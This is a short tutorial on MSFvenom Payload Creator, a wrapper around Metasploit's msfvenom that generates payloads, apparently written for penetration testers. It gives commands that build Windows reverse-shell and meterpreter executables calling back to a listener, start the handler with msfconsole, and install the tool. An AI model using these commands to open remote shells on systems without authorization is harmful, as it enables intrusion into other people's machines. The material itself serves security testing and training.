# MSFvenom Payload Creator (MSFPC)

MSFvenom Payload Creator (MSFPC) is a wrapper to generate multiple types of payloads, based on users choice. The idea is to be as simple as possible (only requiring one input) to produce their payload.

    $ msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>)
    (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>)
    (<VERBOSE>)

* TYPE is the `-f` switch in msfvenom
* DOMAIN/IP is the LHOST option
* PORT is the LPORT option
* CMD/MSF is the type of shell dropped once the payload is executed on the target system.
* BATCH/LOOP to generate multiple payloads (multiple OS platforms) with a single command.

A classic reverse shell payload (generating a payload with a `cmd` as the preferred shell for
Windows, setting the `LHOST` to the IP retrieved from the eth0 Ethernet interface of the Kali machine):

    $ msfpc cmd windows eth0
    
Two files are created, an executable payload by name of `windows-shell-staged-reverse-tcp-443.exe`, and a resource file named `windows-shell-staged-reverse-tcp-443-exe.rc`, useful for automating repetitive tasks in Metasploit. Resource scripts can chain series of Metasploit console commands and directly embed Ruby to do things such as call APIs, interact with objects in the database, and iterate actions.

Drop msf windows:

    $ msfpc msf windows eth0

The payload is now set to a `windows/meterpreter/reverse_tcp`. The associated resource file can be executed with:

    msfconsole -q -r 'windows-meterpreter-staged-reverse-tcp-443-exe.rc'

When the payload is executed, the stager will request for other parts of the payload to be sent over to the target server. These parts of the payload will be sent by payload handler and the complete staged payload is delivered to the victim machine.

MSFvenom Payload Creator is preinstalled in Kali. On other *nix, install it with:

    git clone https://github.com/g0tmi1k/mpc

Set execute permission on the `msfpc.sh` file:

    cd mpc/
    chmod +x msfpc.sh

Start her up with:

    ./msfpc.sh
